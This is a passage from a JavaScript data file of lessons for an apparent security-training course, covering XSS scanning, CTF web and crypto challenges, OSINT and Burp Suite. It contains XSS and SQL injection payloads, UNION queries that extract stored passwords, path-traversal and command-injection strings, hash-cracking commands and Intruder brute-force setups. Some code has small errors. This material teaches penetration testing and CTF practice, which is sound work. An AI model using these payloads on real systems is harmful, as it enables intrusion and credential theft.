              "Check CVE database (NVD API - no auth required):\n" +
              "def check_cve(product, version):\n" +
              "    url = f\"https://services.nvd.nist.gov/rest/json/cves/2.0\"\n" +
              "    params = {'keywordSearch': product, 'resultsPerPage': 5}\n" +
              "    r = requests.get(url, params=params, timeout=10)\n" +
              "    data = r.json()\n" +
              "    vulns = []\n" +
              "    for item in data.get('vulnerabilities', []):\n" +
              "        cve = item['cve']\n" +
              "        cve_id = cve['id']\n" +
              "        desc = cve['descriptions'][0]['value']\n" +
              "        if version in desc:\n" +
              "            vulns.append({'id': cve_id, 'desc': desc[:200]})\n" +
              "    return vulns\n\n" +
              "NVD API tips: Rate limit is 10 requests per 10 seconds. No API key needed for basic access.",
          },
          {
            key: 'mod2_3_1',
            title: 'XSS Detection with Python',
            content:
              "Building a basic XSS scanner helps you understand how automated tools find vulnerabilities.\n\n" +
              "Reflected XSS detection:\n" +
              "XSS_PAYLOADS = [\n" +
              "    '<script>alert(1)</script>',\n" +
              "    '<img src=x onerror=alert(1)>',\n" +
              "    '\"<script>alert(1)</script>',\n" +
              "    \"'><img src=x onerror=alert(1)>\",\n" +
              "    '<svg onload=alert(1)>',\n" +
              "]\n\n" +
              "def find_reflected_xss(url, param_name, param_value):\n" +
              "    for payload in XSS_PAYLOADS:\n" +
              "        test_value = param_value + payload\n" +
              "        r = requests.get(url, params={param_name: test_value})\n" +
              "        if payload in r.text:\n" +
              "            # Check if it is actually executable (not HTML-escaped)\n" +
              "            if payload.replace('<', '&lt;') not in r.text:\n" +
              "                return payload\n" +
              "    return None\n\n" +
              "Key insight: Detection is easy. The hard part is distinguishing dangerous reflection from safe reflection.\n" +
              "Check if: the payload is reflected without HTML encoding, and it is in a context where JS can execute.\n\n" +
              "Verify manually in Repeater: if you see the raw script tag in the response, it is likely real.\n" +
              "If you see &lt;script&gt;, it is being encoded and likely not exploitable.",
          },
        ],
      },
      {
        title: 'Module 4: Reporting',
        lessons: [
          {
            key: 'mod2_4_0',
            title: 'Generating PDF Reports',
            content:
              "Pentest reports need to look professional and be easy to navigate. Here is how to automate PDF generation.\n\n" +
              "Using reportlab:\n" +
              "from reportlab.lib.pagesizes import letter\n" +
              "from reportlab.lib import colors\n" +
              "from reportlab.lib.styles import getSampleStyleSheet\n" +
              "from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, PageBreak\n\n" +
              "def create_report(findings, output='report.pdf'):\n" +
              "    doc = SimpleDocTemplate(output, pagesize=letter)\n" +
              "    styles = getSampleStyleSheet()\n" +
              "    story = []\n\n" +
              "    story.append(Paragraph(\"Penetration Test Report\", styles['Title']))\n" +
              "    story.append(Spacer(1, 20))\n\n" +
              "    story.append(Paragraph(\"Executive Summary\", styles['Heading1']))\n" +
              "    story.append(Paragraph(\n" +
              "        f\"This report documents {len(findings)} vulnerabilities identified during testing.\",\n" +
              "        styles['Normal']))\n" +
              "    story.append(Spacer(1, 20))\n\n" +
              "    table_data = [['#', 'Title', 'Severity', 'CVSS']]\n" +
              "    for i, f in enumerate(findings, 1):\n" +
              "        table_data.append([str(i), f['title'], f['severity'], f.get('cvss', 'N/A')])\n\n" +
              "    t = Table(table_data, colWidths=[30, 200, 80, 60])\n" +
              "    t.setStyle(TableStyle([\n" +
              "        ('BACKGROUND', (0, 0), (-1, 0), colors.grey),\n" +
              "        ('TEXTCOLOR', (0, 0), (-1, 0), colors.whitesmoke),\n" +
              "        ('GRID', (0, 0), (-1, -1), 1, colors.black),\n" +
              "    ]))\n" +
              "    story.append(t)\n" +
              "    doc.build(story)\n" +
              "    print(f\"Report saved to {output}\")",
          },
          {
            key: 'mod2_4_1',
            title: 'HTML Dashboard with Bootstrap',
            content:
              "HTML reports are easy to generate and share. Here is a pattern for a professional security dashboard.\n\n" +
              "Generating an HTML report:\n" +
              "import json\n" +
              "from datetime import datetime\n\n" +
              "def generate_html_report(scan_results, output='report.html'):\n" +
              "    html = f\"\"\"\n" +
              "<!DOCTYPE html>\n" +
              "<html lang=\"en\">\n" +
              "<head>\n" +
              "    <meta charset=\"UTF-8\">\n" +
              "    <title>Security Scan Report - {datetime.now().strftime('%Y-%m-%d')}</title>\n" +
              "    <link href=\"https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css\" rel=\"stylesheet\">\n" +
              "    <style>\n" +
              "        body {{ background: #1a1a2e; color: #eee; }}\n" +
              "        .card {{ background: #16213e; border: 1px solid #0f3460; }}\n" +
              "    </style>\n" +
              "</head>\n" +
              "<body class=\"p-4\">\n" +
              "    <div class=\"container\">\n" +
              "        <h2 class=\"mb-4\">Security Scan Report</h2>\n" +
              "        <p class=\"text-muted\">Generated: {datetime.now().strftime('%Y-%m-%d %H:%M')}</p>\n" +
              "        <div class=\"row mb-4\">\n" +
              "            <div class=\"col-md-4\"><div class=\"card p-3\"><h5>Total Findings</h5><h3>{len(scan_results)}</h3></div></div>\n" +
              "        </div>\n" +
              "        <table class=\"table table-dark table-striped\">\n" +
              "            <thead><tr><th>URL</th><th>Type</th><th>Severity</th><th>Description</th></tr></thead>\n" +
              "            <tbody>\n\"\"\"\n" +
              "    for r in scan_results:\n" +
              "        html += f\"<tr><td><code>{r['url']}</code></td><td>{r['type']}</td><td>{r['severity']}</td><td>{r['description'][:100]}...</td></tr>\"\n\n" +
              "    html += \"</tbody></table></div></body></html>\"\n\n" +
              "    with open(output, 'w') as f:\n" +
              "        f.write(html)\n" +
              "    print(f\"Report: {output}\")",
          },
        ],
      },
    ],
  },
  {
    id: 3,
    title: 'CTF Fundamentals — Win Your First Competition',
    description: 'A practical guide to competitive CTF. Learn the categories, tools, and thinking patterns that separate beginners from finishers.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Beginner',
    duration: '6 hours',
    lessons: 15,
    image: '🚩',
    modules: [
      {
        title: 'Module 1: CTF Mindset & Categories',
        lessons: [
          {
            key: 'mod3_1_0',
            title: 'How CTF Competitions Work',
            content:
              "CTFs are puzzle competitions where you solve security challenges to earn points. Here is how to approach them.\n\n" +
              "Competition formats:\n" +
              "- Jeopardy style (most common): Pick from categories, solve challenges in any order. Points vary by difficulty.\n" +
              "- Attack-Defense: You get a server with vulnerabilities. Defend your box while attacking others'.\n" +
              "- Boot2Root: Single target, get root, submit the flag. Usually individual or small team.\n\n" +
              "Jeopardy categories (standard):\n" +
              "Web - XSS, SQLi, SSRF, IDOR, JWT, etc.\n" +
              "Crypto - Encoding, hashing, classic ciphers, modern crypto\n" +
              "Pwn - Binary exploitation (buffer overflows, ROP, etc.)\n" +
              "Reverse - Disassembling and understanding compiled programs\n" +
              "Forensics - File recovery, steganography, memory analysis, PCAP\n" +
              "OSINT - Open source intelligence (finding info online)\n" +
              "Misc - Anything that does not fit above\n\n" +
              "Time management strategy:\n" +
              "1. Scan all challenges quickly - read every description\n" +
              "2. Pick low-hanging fruit first (easy points build confidence and momentum)\n" +
              "3. Track your work in a spreadsheet\n" +
              "4. If stuck >20 minutes, switch to another challenge\n" +
              "5. Revisit hard challenges with fresh eyes after solving others\n\n" +
              "The key mindset shift: Most CTF challenges are not about discovering 0-days. They are about applying known techniques to new problems. The skill is recognizing which technique applies.",
          },
          {
            key: 'mod3_1_1',
            title: 'Reading Challenge Descriptions Carefully',
            content:
              "The challenge description contains more information than you think. Here is how to extract it.\n\n" +
              "What to look for:\n" +
              "- Title: 'Login Bypass 101'\n" +
              "- Points: 100 (tells you difficulty - low points = easier)\n" +
              "- Category: Web\n" +
              "- Description: 'A login form is misconfigured. Use classic SQLi to bypass authentication.'\n" +
              "- Hints (sometimes)\n" +
              "- Attached files: download.file (contains source code, binary, etc.)\n" +
              "- Connection info: target.com:12345 (for remote challenges)\n\n" +
              "What 'files' tells you:\n" +
              "- If a .py file is attached - read the source code, the vulnerability is in there\n" +
              "- If an executable is attached - it is a pwn or reverse challenge\n" +
              "- If a .pcap is attached - it is forensics or network analysis\n" +
              "- If a .jpg is attached - steganography\n\n" +
              "Remote vs local challenges:\n" +
              "- Local: You download a file and analyze it on your machine\n" +
              "- Remote: You connect to a service (netcat target:port) to interact with it live\n\n" +
              "For remote challenges: nc target.com 12345\n" +
              "Use 'script' to record everything: script -qf /tmp/ctf.log nc target.com 12345",
          },
        ],
      },
      {
        title: 'Module 2: Web Challenges',
        lessons: [
          {
            key: 'mod3_2_0',
            title: 'Reading PHP Source Code',
            content:
              "Many web CTFs give you source code to find the vulnerability. Here is how to read PHP quickly.\n\n" +
              "Common patterns to look for:\n\n" +
              "# SQL Injection - user input directly in query\n" +
              "$query = \"SELECT * FROM users WHERE id = \" . $_GET['id'];\n\n" +
              "# File inclusion - user input in include or require\n" +
              "include(\"pages/\" . $_GET['page'] . \".php\");\n\n" +
              "# Command injection - user input in system calls\n" +
              "system(\"ping \" . $_GET['ip']);\n\n" +
              "# XSS - user input reflected without encoding\n" +
              "echo $_GET['name'];\n\n" +
              "# Authentication bypass - weak session checks\n" +
              "if ($_COOKIE['admin'] == 'yes')\n\n" +
              "Reading a PHP source dump:\n" +
              "grep -r \"password\\|secret\\|key\\|admin\\|include\\|require\\|eval\\|system\\|exec\" index.php\n\n" +
              "The config file trap:\n" +
              "# Many CTFs put credentials in config files:\n" +
              "define('DB_USER', 'ctfuser');\n" +
              "define('DB_PASS', 'super_secret_pass_123');\n\n" +
              "PHP trick: variable variables:\n" +
              "$a = \"hello\"; $$a = \"world\"; echo $hello; // prints \"world\"",
          },
          {
            key: 'mod3_2_1',
            title: 'Basic SQL Injection Patterns',
            content:
              "SQL injection is the most common web CTF category. These are the patterns that win challenges.\n\n" +
              "Authentication bypass:\n" +
              "admin'--\n" +
              "admin' or '1'='1\n" +
              "' or 1=1--\n\n" +
              "In PHP with:\n" +
              "$query = \"SELECT * FROM users WHERE username='$user' AND password='$pass'\";\n" +
              "Enter: admin'-- as username (password does not matter)\n" +
              "Query becomes: WHERE username='admin'--' AND password='...'\n" +
              "'--' comments out the rest.\n\n" +
              "UNION injection (extract data from other tables):\n" +
              "# Find how many columns:\n" +
              "' UNION SELECT 1,2,3-- -\n\n" +
              "# When you know column count:\n" +
              "' UNION SELECT 1,2,3-- -\n\n" +
              "# Replace numbers with data:\n" +
              "' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -\n\n" +
              "# Get users table:\n" +
              "' UNION SELECT 1,username,password FROM users-- -\n\n" +
              "Automated with SQLMap:\n" +
              "# Capture a request in Burp > save as request.txt\n" +
              "sqlmap -r request.txt --batch --dbs\n" +
              "sqlmap -r request.txt -D ctfdb -T flags --dump",
          },
          {
            key: 'mod3_2_2',
            title: 'JavaScript Deobfuscation',
            content:
              "CTF web challenges often hide payloads in obfuscated JavaScript. Here is how to decode it.\n\n" +
              "Reading minified JS:\n" +
              "grep -o 'eval.*' script.js\n" +
              "grep -o 'document\\[.*\\]' script.js\n" +
              "grep -o 'String.fromCharCode.*' script.js\n\n" +
              "Common obfuscation techniques:\n\n" +
              "# 1. String char codes\n" +
              "eval(String.fromCharCode(97,108,101,114,116))\n\n" +
              "# 2. Hex encoding\n" +
              "eval(\"\\\\x61\\\\x6c\\\\x65\\\\x72\\\\x74\")\n\n" +
              "# 3. Base64\n" +
              "atob(\"YWxlcnQoMSk=\")  // alert(1)\n\n" +
              "# 4. JSFuck (only 6 chars: []()!+)\n" +
              "# Decode with: https://jsfuck.com/\n\n" +
              "Quick deobfuscation in browser:\n" +
              "1. Open DevTools > Console\n" +
              "2. Paste the obfuscated code\n" +
              "3. Replace eval with console.log to see what it evaluates to\n" +
              "4. Or set a breakpoint before the eval and inspect the string\n\n" +
              "Regex for extracting hidden data:\n" +
              "Match base64 strings: /[A-Za-z0-9+/=]{20,}/g\n" +
              "Match URLs: /https?:\\/\\/[^\\s\"]+/g\n" +
              "Find interesting patterns: /secret|password|key|flag|token/i",
          },
        ],
      },
      {
        title: 'Module 3: Crypto Basics',
        lessons: [
          {
            key: 'mod3_3_0',
            title: 'Encoding: Base64, Hex, ROT13',
            content:
              "Crypto challenges often start with encoded data. Here is the decoding toolkit.\n\n" +
              "Base64:\n" +
              "echo \"c2VjY3JldA==\" | base64 -d  # decode\n" +
              "echo \"secret\" | base64          # encode\n\n" +
              "Python:\n" +
              "import base64\n" +
              "base64.b64decode(\"c2VjY3JldA==\")\n" +
              "base64.b64encode(b\"secret\")\n\n" +
              "Hex (ASCII hex):\n" +
              "echo \"736563726574\" | xxd -r -p  # decode\n" +
              "echo \"secret\" | xxd -p           # encode\n\n" +
              "Python:\n" +
              "bytes.fromhex(\"736563726574\").decode()  # 'secret'\n" +
              "\"secret\".encode().hex()                  # '736563726574'\n\n" +
              "ROT13 (Caesar cipher with shift 13):\n" +
              "echo \"uryyb\" | tr 'A-Za-z' 'N-ZA-Mn-za-m'\n\n" +
              "Multi-layer encoding (very common in CTFs):\n" +
              "Data is often encoded multiple times:\n" +
              "base64(hex(rot13(data)))\n\n" +
              "To decode, figure out the order. Start from the inside and work out.\n\n" +
              "Cyberchef (the CTF crypto tool): https://gchq.github.io/CyberChef/\n" +
              "Recipe for multi-layer decode: From_Base64 > From_Hex > ROT13",
          },
          {
            key: 'mod3_3_1',
            title: 'Identifying & Cracking Hashes',
            content:
              "Hashes look random but are deterministic. Identify the type, then crack it.\n\n" +
              "Common hash formats:\n" +
              "MD5:     5f4dcc3b5aa765d61d8327deb882cf99 (32 hex chars)\n" +
              "SHA1:    5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8 (40 hex chars)\n" +
              "SHA256:  2c26b46b68ffc698ffbca6a3f28f71a3247eeda7... (64 hex chars)\n\n" +
              "Identifying hash type by length:\n" +
              "32 chars - MD5 or MD4\n" +
              "40 chars - SHA1\n" +
              "64 chars - SHA256\n\n" +
              "Cracking with hashcat:\n" +
              "hashcat -m 0   # MD5\n" +
              "hashcat -m 100  # SHA1\n" +
              "hashcat -m 1400 # SHA256\n\n" +
              "Wordlist attack:\n" +
              "hashcat -m 0 -a 0 hash.txt wordlist.txt\n\n" +
              "Rule-based attack (best for variations):\n" +
              "hashcat -m 0 -a 0 hash.txt wordlist.txt -j \"c $\"\n\n" +
              "Cracking with John:\n" +
              "john --wordlist=rockyou.txt hash.txt\n" +
              "john --format=raw-md5 hash.txt\n\n" +
              "The number one trick:\n" +
              "Check if the hash appears in a public leak database first!\n" +
              "https://haveibeenpwned.com/ (API available)\n" +
              "Or just Google the hash.",
          },
          {
            key: 'mod3_3_2',
            title: 'XOR Basics',
            content:
              "XOR is a fundamental operation in CTF crypto challenges. Understanding it is essential.\n\n" +
              "What XOR does:\n" +
              "0 XOR 0 = 0\n" +
              "1 XOR 1 = 0\n" +
              "0 XOR 1 = 1\n" +
              "1 XOR 0 = 1\n\n" +
              "Simple rule: outputs 1 when inputs differ.\n\n" +
              "Why it is used in CTFs:\n" +
              "- XOR with a single byte key encrypts data simply\n" +
              "- If you know part of the plaintext, you can recover the key\n" +
              "- Many 'custom encryption' schemes in CTF are just XOR\n\n" +
              "XOR in Python:\n" +
              "def xor(data, key):\n" +
              "    return bytes([b ^ key for b in data])\n\n" +
              "# Example:\n" +
              "encrypted = xor(b\"secret\", 0x41)  # XOR with 'A'\n" +
              "decrypted = xor(encrypted, 0x41)   # XOR again to decrypt\n\n" +
              "Recovering XOR key when you know plaintext:\n" +
              "# key[position] = ciphertext[position] XOR plaintext[position]\n\n" +
              "Breaking repeating-key XOR:\n" +
              "Use hamming distance to guess key length. The key length with the lowest normalized hamming distance between chunks is likely correct.\n\n" +
              "Then break each byte position independently using frequency analysis.",
          },
        ],
      },
      {
        title: 'Module 4: OSINT for CTFs',
        lessons: [
          {
            key: 'mod3_4_0',
            title: 'Google Dorking for CTF OSINT',
            content:
              "OSINT challenges are about finding publicly available information that reveals something hidden.\n\n" +
              "Google dorking syntax:\n" +
              "site:target.com          - restrict to domain\n" +
              "filetype:pdf             - find file types\n" +
              "intitle:\"secret\"         - page title contains\n" +
              "inurl:admin              - URL contains\n" +
              "\"password\" site:target.com - specific phrase on domain\n\n" +
              "Combinations for CTF:\n" +
              "site:github.com \"target.com\" password\n" +
              "site:pastebin.com \"api_key\"\n" +
              "filetype:log \"error\" \"target.com\"\n" +
              "intitle:\"Index of\" \"backup\"\n\n" +
              "Wayback Machine (web.archive.org):\n" +
              "See what a site looked like in the past. Especially useful for deleted files, old credentials, and historical vulnerability pages.\n\n" +
              "Shodan (shodan.io):\n" +
              "Find exposed services:\n" +
              "product:\"Apache\" country:\"NG\"  (web servers in Nigeria)\n" +
              "port:22 country:\"NG\"            (SSH servers)\n" +
              "product:\"MongoDB\" unauthenticated\n\n" +
              "Practical CTF OSINT workflow:\n" +
              "Given a company name and a flag format hint:\n" +
              "1. Find associated domains and IPs (DNS records, passive DNS, crt.sh certificates)\n" +
              "2. Find exposed documents (Google dorking, GitHub search)\n" +
              "3. Find employee names and email patterns (LinkedIn, company website staff list)\n" +
              "4. Find historical exposure (Wayback machine, compromised database searches)",
          },
          {
            key: 'mod3_4_1',
            title: 'Metadata Extraction from Files',
            content:
              "Files you download in CTFs often contain hidden information in their metadata.\n\n" +
              "Common metadata sources:\n" +
              "Images: GPS coordinates, camera model, software used, timestamps\n" +
              "Documents: Author name, company, last saved by, edit history\n" +
              "PDFs: Creator, creation date, embedded files\n" +
              "ZIPs: File names inside, tool that created the archive\n" +
              "Executables: Compile timestamp, debug symbols, imports and exports\n\n" +
              "Tools:\n\n" +
              "ExifTool (best for images):\n" +
              "exiftool photo.jpg\n" +
              "exiftool -gps:* photo.jpg  (just GPS data)\n\n" +
              "Strings (for any file):\n" +
              "strings target.bin | grep -i \"password\\|secret\\|key\\|flag\"\n" +
              "strings target.bin | tail -50\n\n" +
              "Binwalk (for embedded files):\n" +
              "binwalk firmware.bin       (find embedded files)\n" +
              "binwalk -e firmware.bin     (extract everything)\n\n" +
              "Steganography (hidden data in images):\n" +
              "binwalk image.jpg        (look for appended data)\n" +
              "steghide extract -sf image.jpg\n" +
              "zsteg image.png\n\n" +
              "When metadata points to another challenge:\n" +
              "CTF OSINT is a chain - metadata from one file might give you a password for another challenge, a name to search for, or coordinates that reveal a URL hidden in the metadata.",
          },
          {
            key: 'mod3_4_2',
            title: 'Finding Hidden Files',
            content:
              "CTF challenges often hide files that are not obvious. Here is how to find everything.\n\n" +
              "In a ZIP or Archive:\n" +
              "unzip -l archive.zip\n" +
              "7z l archive.zip\n\n" +
              "Check for nested archives:\n" +
              "binwalk archive.zip\n" +
              "# If binwalk finds another ZIP inside, extract and repeat\n\n" +
              "PNG images often contain hidden data:\n" +
              "pngcheck image.png\n" +
              "zsteg image.png (best for LSB stego)\n" +
              "tail -c 10000 image.jpg (last 10KB of image)\n\n" +
              "File type tricks:\n" +
              "# A file might be misnamed:\n" +
              "file suspicious.pdf\n" +
              "# If it is really a ZIP:\n" +
              "mv suspicious.pdf s.zip && unzip s.zip\n\n" +
              "Look for file signatures:\n" +
              "PNG: 89 50 4E 47\n" +
              "ZIP: 50 4B 03 04\n" +
              "PDF: 25 50 44 46\n" +
              "JPG: FF D8 FF\n\n" +
              "Recursive extraction pattern:\n" +
              "while true; do\n" +
              "    find . -type f \\( -name \"*.zip\" -o -name \"*.tar\" -o -name \"*.gz\" \\) -exec echo \"Found: {}\" \\; -exec tar -xzf {} \\;\n" +
              "    sleep 1\n" +
              "done",
          },
        ],
      },
    ],
  },
  {
    id: 4,
    title: 'Burp Suite Mastery',
    description: 'Go beyond Repeater and Intruder. Full guide to active scanning, macro-based testing, JWT manipulation, and custom extensions.',
    instructor: 'Muhammad Aminu Musa',
    level: 'Intermediate – Advanced',
    duration: '10 hours',
    lessons: 22,
    image: '🔍',
    modules: [
      {
        title: 'Module 1: Proxy Deep Dive',
        lessons: [
          {
            key: 'mod4_1_0',
            title: 'Scoped Rules & Intercept Filtering',
            content:
              "Mastering the Proxy tab is the foundation of efficient web testing. Here is what most people miss.\n\n" +
              "Setting proper scope:\n" +
              "Right-click request > Add to scope\n" +
              "Or: Target > Scope > Add include and exclude patterns\n\n" +
              "Include regex examples:\n" +
              "^https://target\\.com.*\n" +
              "^http://api\\.target\\.com.*\n\n" +
              "Exclude (for noise reduction):\n" +
              ".*\\.css$\n" +
              ".*\\.js$\n" +
              ".*\\.png$\n" +
              ".*google-analytics.*\n\n" +
              "Intercept options:\n" +
              "- Options tab > Intercept Client Requests: match rules determine which requests are paused\n" +
              "- Add rules for: Form submissions, API calls, WebSocket messages\n\n" +
              "Key proxy settings:\n" +
              "- Intercept responses based on server response (not just requests)\n" +
              "- Automatically update Content-Length (for modified request bodies)\n" +
              "- Unsubscribe from hidden domains (prevents intercepting third-party requests)\n" +
              "- Follow redirections (handle 301/302 without stopping)\n\n" +
              "Match and Replace:\n" +
              "Automatically modify requests and responses as they pass through:\n" +
              "- Add a header to every request\n" +
              "- Replace responses (hide tech fingerprint)\n" +
              "- Remove security headers to test clickjacking\n\n" +
              "Proxy history filtering:\n" +
              "Ctrl+F in proxy history searches request and response",
          },
          {
            key: 'mod4_1_1',
            title: 'Client-Side TLS Certificates & HTTP Domains',
            content:
              "Some targets use client certificates or reside on non-standard HTTP ports. Here is how to handle them.\n\n" +
              "Installing Burp CA certificate:\n" +
              "1. In browser: http://burpsuite/cert\n" +
              "2. Save the certificate\n" +
              "3. Browser settings > Privacy > Certificates > Import\n" +
              "4. Select Websites trust level\n\n" +
              "Client certificate authentication:\n" +
              "Proxy > Options > TLS PassThrough > Add client certificate (.p12 with private key)\n\n" +
              "Non-standard HTTP ports:\n" +
              "Proxy > Options > Add > Binding tab:\n" +
              "- Bind to port: 9999\n" +
              "- Bind to address: loopback only\n\n" +
              "Invisible HTTPS (non-standard ports that require TLS):\n" +
              "Proxy > Options > TLS PassThrough:\n" +
              "- Enable Support invisible HTTPS redirection\n" +
              "- Add rules for domains that use non-standard HTTPS ports\n\n" +
              "If cert errors occur, add the domain to:\n" +
              "Proxy > Options > TLS PassThrough > Never check client certificates",
          },
        ],
      },
      {
        title: 'Module 2: Active Scanning',
        lessons: [
          {
            key: 'mod4_2_0',
            title: 'Scan Coverage & Configuration',
            content:
              "Active scanning finds vulnerabilities by sending modified requests. Here is how to configure it properly.\n\n" +
              "Scan types:\n" +
              "Passive: Only observes traffic through proxy (no modifications)\n" +
              "Active: Sends attack payloads to discover vulnerabilities\n" +
              "JavaScript: Parses and analyzes client-side JS for issues\n\n" +
              "Scan configuration:\n" +
              "Target > Site map > right-click:\n" +
              "- Scope: what to scan\n" +
              "- Insertion points (where to inject payloads): URL params, body params, headers, cookies, URL file path segments\n" +
              "- Scan speed: Conservative / Normal / Thorough / Intrusive\n\n" +
              "What each scanner module checks:\n" +
              "SQL Injection: Tries ', \", ), '; tests error-based, boolean, time-based\n" +
              "XSS: Reflected parameters in HTML, JS context, attribute context\n" +
              "Path Traversal: ../../../etc/passwd variations\n" +
              "Command Injection: ;ls, &&ls, |ls, `ls`\n" +
              "CSRF: Detects state-changing actions without anti-CSRF tokens\n\n" +
              "Best practice: Scan last, test first.\n" +
              "Manual testing to understand the app, then targeted active scan on specific endpoints.",
          },
          {
            key: 'mod4_2_1',
            title: 'False Positive Management',
            content:
              "Active scanners generate noise. Here is how to separate real findings from false positives.\n\n" +
              "Verifying each finding before reporting:\n" +
              "1. Look at the actual payload sent\n" +
              "2. Look at the actual response received\n" +
              "3. Ask: does this actually make the app behave differently?\n\n" +
              "Common false positives:\n" +
              "- Scanner detects XSS but the payload is HTML-encoded in the response\n" +
              "- Path traversal found but app returns 404 for the file\n" +
              "- SQL Injection in a non-functional parameter (the app ignores it)\n\n" +
              "Reproducing manually:\n" +
              "Take the payload Burp sent, replay in Repeater.\n" +
              "If you see the raw <script> tag in the response, it is likely real.\n" +
              "If you see &lt;script&gt;, it is being encoded (likely not exploitable).\n\n" +
              "Test with a unique marker:\n" +
              "<script>alert(UNIQUE_TEST_12345)</script>\n" +
              "If the page alerts (XSS executes), it is real.\n" +
              "If you see the script tag rendered as text, it is reflected but not executable.\n\n" +
              "Burp Confirm feature:\n" +
              "Right-click issue > Do a live scan\n" +
              "Burp sends a safe probe to verify the finding.",
          },
          {
            key: 'mod4_2_2',
            title: 'Scan Scheduling & Automation',
            content:
              "You can schedule scans to run during off-peak hours or integrate them into your workflow.\n\n" +
              "Scheduling scans:\n" +
              "Burp Professional allows scheduling scans to run at specific times, resume interrupted scans, and run scans in background while you manually test other targets.\n\n" +
              "Target > Site map > right-click > Schedule active scan\n\n" +
              "Use Burp REST API to trigger scans:\n" +
              "curl -X POST \"http://127.0.0.1:1337/v0.1/scan\" \\\n" +
              "  -H \"Content-Type: application/json\" \\\n" +
              "  -d '{\"urls\": [\"https://target.com/api\"]}'\n\n" +
              "Managing scan results:\n" +
              "- Export findings: Burp > Dashboard > Scan information > Export issues\n" +
              "- Filter by severity\n" +
              "- Group by type or URL\n" +
              "- Set status: New > Confirmed > Fixed > Verified\n\n" +
              "Best practice: Scan last, test first.\n" +
              "Active scanning is loud and slow. Better approach:\n" +
              "1. Manual testing to understand the app\n" +
              "2. Passive scan to capture all traffic\n" +
              "3. Targeted active scan on specific endpoints\n" +
              "4. Save full scans for when you need comprehensive coverage.",
          },
        ],
      },
      {
        title: 'Module 3: Intruder Advanced',
        lessons: [
          {
            key: 'mod4_3_0',
            title: 'Pitchfork Mode for Credential Stuffing',
            content:
              "Intruder's Pitchfork mode lets you test multiple credential combinations simultaneously.\n\n" +
              "Pitchfork vs Sniper vs Cluster bomb:\n" +
              "Sniper: 1 position, 1 wordlist (testing one param)\n" +
              "Pitchfork: Multiple positions, each gets its own list (1-to-1 pairing)\n" +
              "Cluster bomb: Multiple positions, each gets its own list (full cartesian product)\n\n" +
              "Credential stuffing with Pitchfork:\n" +
              "POST /api/login with {\"username\":\"USER\",\"password\":\"PASS\"}\n\n" +
              "In Intruder:\n" +
              "Mark USER position > payload set 1 = usernames.txt\n" +
              "Mark PASS position > payload set 2 = passwords.txt\n\n" +
              "Pitchfork matches line 1 of userlist with line 1 of passlist.\n" +
              "Line 2 with line 2, etc.\n\n" +
              "Use case: test known credential pairs (username matches password)\n\n" +
              "Cluster bomb for mass combinations:\n" +
              "Use cluster bomb when you have 10 usernames and 10 passwords = 100 combinations (full cartesian).\n" +
              "Great for brute force when you know username and need to try many passwords.\n\n" +
              "Always check terms of service and rate limiting.\n" +
              "Some apps lock accounts after 3 failed attempts.",
          },
          {
            key: 'mod4_3_1',
            title: 'Grep Extracts & Data Extraction',
            content:
              "Intruder's grep functionality lets you extract data from responses automatically.\n\n" +
              "Setting up grep for extraction:\n" +
              "1. Send request to Intruder\n" +
              "2. Positions > clear all > mark only the part you want to extract\n" +
              "3. Payload set = null (no payloads, just position for extraction)\n" +
              "4. Options > Grep - Extract > Add > define start and end boundaries\n\n" +
              "Example: Extract CSRF tokens from responses\n" +
              "Start: '<input name=\"csrf\" value=\"'\n" +
              "End: '\"'>'\n\n" +
              "Using extracted values in subsequent requests:\n" +
              "Options > Grep - Extract > Add\n" +
              "Then in the actual request, use the extracted value in the marked position.\n\n" +
              "Payload type: Recursive grep:\n" +
              "For pages that require a token to proceed:\n" +
              "1. Set position where token goes in request\n" +
              "2. Payload type: Recursive grep\n" +
              "3. Payload set 1: Initial request to get token (URL: the form page)\n" +
              "4. Payload set 2: Grep match - extract token from response\n" +
              "5. Use this as the payload for the marked position\n\n" +
              "Useful for: CSRF-protected forms, session-rotating endpoints, any endpoint requiring valid session plus token combination.",
          },
          {
            key: 'mod4_3_2',
            title: 'Macros for Multi-Step Flows',
            content:
              "Macros let you automate multi-step sequences before each Intruder request. Essential for testing authenticated endpoints.\n\n" +
              "Setting up a macro:\n" +
              "1. Proxy > Options > Macros > Record macro\n" +
              "2. Walk through the steps manually:\n" +
              "   a. GET /login (receives session cookie)\n" +
              "   b. POST /auth (validates credentials)\n" +
              "   c. GET /dashboard (authenticated)\n" +
              "3. Stop recording\n" +
              "4. Configure which parameters are dynamic (session cookie auto-handled, CSRF tokens use extracted values)\n" +
              "5. Test the macro to ensure it works\n\n" +
              "Macro will replay all steps before each Intruder request.\n" +
              "Ensures your request always has a valid session.\n\n" +
              "Handling dynamic tokens:\n" +
              "1. GET /form > extract value from response\n" +
              "2. POST /submit > use the extracted value in the request\n" +
              "3. Mark the token position\n" +
              "4. Payload type: Extracted from macro step 1\n\n" +
              "Session handling rules:\n" +
              "Tools > Session Handling > Session handling rules > Add\n" +
              "Configure scope, set which macro to run, set how Burp handles invalid sessions.",
          },
        ],
      },
      {
        title: 'Module 4: Extender',
        lessons: [
          {
            key: 'mod4_4_0',
            title: 'Writing BApp Store Extensions',
            content:
              "Burp extensions let you automate anything. The Python API is the most accessible for security researchers.\n\n" +
              "Setting up:\n" +
              "1. Extender > Add > Python (Jython required)\n" +
              "2. Download Jython standalone JAR from jython.org\n" +
              "3. Extender > Options > Python Environment > Select JAR\n" +
              "4. Restart Burp\n\n" +
              "Basic Burp Python extension skeleton:\n" +
              "from burp import IBurpExtender, ITab\n\n" +
              "class BurpExtender(IBurpExtender, ITab):\n" +
              "    def registerBurpCallbacks(self, callbacks):\n" +
              "        self.callbacks = callbacks\n" +
              "        self.helpers = callbacks.getHelpers()\n" +
              "        callbacks.addSuiteTab(self)\n" +
              "        callbacks.registerHttpListener(self)\n" +
              "        print(\"Extension loaded!\")\n\n" +
              "    def processHttpMessage(self, toolName, isRequest, messageInfo):\n" +
              "        if isRequest:\n" +
              "            pass  # Modify requests before they are sent\n" +
              "        else:\n" +
              "            pass  # Analyze responses\n\n" +
              "Common extension tasks:\n" +
              "- Auto-find and highlight sensitive data in responses\n" +
              "- Add custom scan checks\n" +
              "- Passive scan findings (runs on all traffic)\n" +
              "- Modify request and response on the fly\n\n" +
              "Community BApps worth installing:\n" +
